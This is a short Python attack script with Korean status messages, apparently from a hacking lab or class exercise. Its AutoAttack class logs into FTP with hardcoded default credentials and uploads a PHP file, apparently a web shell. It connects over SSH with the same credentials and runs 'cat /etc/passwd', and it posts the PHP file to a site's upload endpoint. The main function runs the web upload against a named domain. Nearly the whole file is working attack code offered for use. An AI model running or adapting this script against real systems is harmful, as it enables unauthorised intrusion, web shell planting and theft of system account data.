import ftplib
import webbrowser
import paramiko
import requests

class AutoAttack:
   def __init__(self,hostname,port):
      print("초기화 성공")
      self.hostname = hostname
      self.port=port

   def ftpAttack(self):
      ftp = ftplib.FTP(self.hostname)
      ret = ftp.login("master","123456")
      ftp.set_pasv(False)
      print("ftp공격시작")
      print(ftp.getwelcome())
      # print(ftp.dir())
      
      uploadfile = "aheunws.php"
      with open(uploadfile, 'rb') as read_f:
         ftp.storlines('STOR ' + "hi.php", read_f)

      # ftp.retrlines('RETR ' + uploadfile, f.write) #아스키모드에서 FTP서버에서 FTP 클라이언트로 파일수신
      # print(ftp.dir())
      webbrowser.open("http://www.kae.kr/aheunws.php")
      print("파일 전송 완료")

      print(self.hostname,self.port)
      print(ret)
      print("ftp공격종료")
   
   def sshAttack(self):
      print("ssh공격시작")
      ssh = paramiko.SSHClient()
      ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
      # try:
      chk = ssh.connect("192.168.0.34", port=22, username="master", password="123456")

      if chk is None:
         print("success!")
         stdin, stdout, stderr = ssh.exec_command("cat /etc/passwd")
         print("".join(stdout.readlines()))
         # lines=stdout.readlines() #
         # print("".join(lines)) 
      else:
         print("fail")

      # print(self.hostname,self.port)
      print("ssh공격종료")


   def webAttack(self):
      print("web공격 시작")
      upload = {'fileToUpload': open('aheunws.php', 'rb')}
      response = requests.post('http://www.kae.kr/upload_ok.php', files = upload)
      print(response.text)
      print(self.hostname, self.port)
      print("web공격 종료")


def main():
   print("Start Program")
   # a1 = AutoAttack("www.kae.kr",21)
   # # print(a1,type(a1),dir(a1))
   # a1.ftpAttack()
   # a2 = AutoAttack("www.kae.kr",22)
   # a2.sshAttack()
   a3 = AutoAttack("www.kae.kr",80)
   a3.webAttack()

if __name__ == '__main__':
   main()